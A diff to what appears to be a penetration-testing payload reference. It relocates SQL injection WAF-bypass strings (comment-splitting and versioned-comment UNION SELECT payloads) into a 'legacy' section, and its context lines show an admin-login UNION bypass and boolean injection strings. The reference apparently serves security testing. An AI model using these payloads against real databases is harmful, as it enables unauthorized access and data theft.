@@ -169,14 +169,6 @@ admin' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055'--
 
 ## WAF Bypass Techniques
 
-### Comment Injection
-
-```sql
-1/*comment*/AND/**/1=1/**/--
-1/*!12345UNION*//*!12345SELECT*/1--
-1'/*!50000UNION*/ /*!50000SELECT*/ 1,2,version()--
-```
-
 ### Whitespace Alternatives (URL-Encoded)
 
 ```
@@ -210,6 +202,19 @@ WHERE -> HAVING
 ```sql
 (1)and(1)=(1)--
 (1)or(1)=(1)--
+```
+
+### Comment-Splitting (legacy — rarely effective against modern WAFs)
+
+`agent/skills/sqli-testing/SKILL.md` "WAF Bypass Reality" — every default ruleset on
+Cloudflare/AWS WAF/Akamai signature-matches this split now; do not spend engagement
+time on it as a bypass. Kept here as raw syntax that is still useful against an
+unpatched target or a request path with no WAF in front of it:
+
+```sql
+1/*comment*/AND/**/1=1/**/--
+1/*!12345UNION*//*!12345SELECT*/1--
+1'/*!50000UNION*/ /*!50000SELECT*/ 1,2,version()--
 ```
 
 ## DBMS Fingerprinting
